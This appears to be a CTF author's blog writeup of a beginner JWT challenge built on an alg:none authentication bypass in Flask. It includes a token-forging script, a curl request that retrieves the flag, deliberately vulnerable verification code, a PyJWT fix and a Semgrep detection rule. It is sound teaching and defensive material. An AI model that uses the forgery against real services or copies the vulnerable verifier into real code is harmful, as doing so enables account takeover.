---
title: "Author's writeup: the JWT alg:none challenge I built for CSECcon"
date: 2026-11-29
type: writeup
summary: "How my CSECcon JWT challenge works, the intended solve, the root cause in one line, the fix, and a Semgrep rule that stops the bug coming back."
tags: [ctf, web, jwt, flask, appsec, semgrep]
platform: CSECcon (UTS CSEC)
difficulty: beginner
featured: true
draft: false
---

Most JWT writeups are written from the attacker's side. As the author of this challenge I had to write the bug on purpose, and that made the root cause very plain: the server let the token decide how the token should be checked.

> [!NOTE]
> The code in this post is a trimmed-down version of the challenge. Every snippet was run as written: the forged token gets the flag from the vulnerable app, the fixed app answers 401, and the Semgrep rule flags only the unsafe code.

## The setup

Players get a small Flask app and start with a normal user's `session` cookie. That cookie is a JWT. The `/admin` route returns the flag only when the token's claims say `"role": "admin"`.

## The intended solve

1. Notice the cookie is a JWT: three base64url parts joined by dots. The first part decodes to `{"alg":"HS256","typ":"JWT"}`.
2. Decode the middle part and find `"role": "user"`.
3. Change the role to `admin` and send it back. The server answers 401, because the signature no longer matches. So the server does check signatures. Sometimes.
4. Set the header's `alg` to `none`, drop the signature, and try again.

```python title="forge.py"
import base64
import json


def b64url(obj: dict) -> str:
    raw = json.dumps(obj, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


header = {"alg": "none", "typ": "JWT"}
claims = {"sub": "player", "role": "admin"}

# alg:none means no signature, so the token ends with an empty third part
print(f"{b64url(header)}.{b64url(claims)}.")
```

```console
$ python3 forge.py
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJwbGF5ZXIiLCJyb2xlIjoiYWRtaW4ifQ.
$ curl -s -b "session=$(python3 forge.py)" http://localhost:5000/admin
CSEC{example_flag}
```

## The vulnerable code

```python title="vulnerable_app.py" {6-7}
def verify_token(token: str) -> dict:
    header_b64, payload_b64, sig_b64 = token.split(".")
    header = json.loads(b64url_decode(header_b64))

    # The bug: the token itself decides how it gets checked.
    if header.get("alg") == "none":
        return json.loads(b64url_decode(payload_b64))

    signing_input = f"{header_b64}.{payload_b64}".encode()
    expected = hmac.new(SECRET, signing_input, hashlib.sha256).digest()
    if not hmac.compare_digest(expected, b64url_decode(sig_b64)):
        abort(401)
    return json.loads(b64url_decode(payload_b64))
```

The HMAC check itself is fine. It even uses a constant-time comparison. The problem is two lines earlier: the attacker's own header chooses whether that check runs at all.

## Root cause

The server lets untrusted input choose the security control. `none` is a real algorithm in the JWT standards (RFC 7518 defines it for unsecured tokens), so any verifier that reads `alg` from the token and obeys it will accept unsigned tokens.

The same shape turns up well beyond JWTs: a request field that picks the authentication method, a client-side role flag, a `debug` parameter. When I review code now, I ask the same question of every check: who decides whether this runs?

## The fix

```python title="fixed_app.py"
import os

import jwt  # PyJWT
from flask import abort

SECRET = os.environ["JWT_SECRET"]


def verify_token(token: str) -> dict:
    try:
        # The server picks the algorithm. The token's header gets no say.
        return jwt.decode(token, SECRET, algorithms=["HS256"])
    except jwt.InvalidTokenError:
        abort(401)
```

- **A maintained library** instead of hand-rolled parsing.
- **An explicit list of allowed algorithms.** PyJWT rejects the forged `alg: none` token here, and the app answers 401.
- **The secret comes from the environment**, not the source code.

## Stopping it coming back: a Semgrep rule

A fix in one file doesn't stop the next developer writing the same bug. This rule flags the hand-rolled version and the two common PyJWT mistakes:

```yaml title="jwt-unverified.yaml"
rules:
  - id: jwt-signature-not-verified
    languages: [python]
    severity: ERROR
    message: >-
      This code can accept a JWT without a verified signature. Decode with a
      key and a fixed list of algorithms, e.g.
      jwt.decode(token, key, algorithms=["HS256"]).
    pattern-either:
      # PyJWT told to skip the signature check
      - pattern: 'jwt.decode(..., options={..., "verify_signature": False, ...}, ...)'
      # PyJWT allowed to accept unsigned tokens
      - pattern: 'jwt.decode(..., algorithms=[..., "none", ...], ...)'
      # Hand-rolled verifiers that trust the token's own alg header
      - pattern: '$HEADER.get("alg") == "none"'
      - pattern: '$HEADER["alg"] == "none"'
```

Run against both versions, it flags only the vulnerable one:

```console
$ semgrep --config jwt-unverified.yaml vulnerable_app.py fixed_app.py

    vulnerable_app.py
   ❯❯❱ jwt-signature-not-verified
          This code can accept a JWT without a verified signature. ...

           22┆ if header.get("alg") == "none":
```

I also tested it on six small snippets. The four unsafe patterns were flagged. `jwt.decode(t, key, algorithms=["HS256"])`, with and without extra `options`, was not. In a real codebase this rule belongs in CI, so a pull request that reintroduces the bug fails before anyone has to spot it in review.

## Why I designed it this way

The challenge is aimed at beginners, so I built it around three rules. Each step teaches one concept. The responses teach too: a 401 for a bad signature and a 403 for the wrong role tell a player exactly which check they're up against. And nothing depends on guessing, so a player who finishes it has learned the bug, not a trick.

## For developers, in three lines

- Never let a token choose its own algorithm.
- Use a maintained library and always pass `algorithms=` explicitly.
- Put a rule like the one above in CI so the bug can't return.
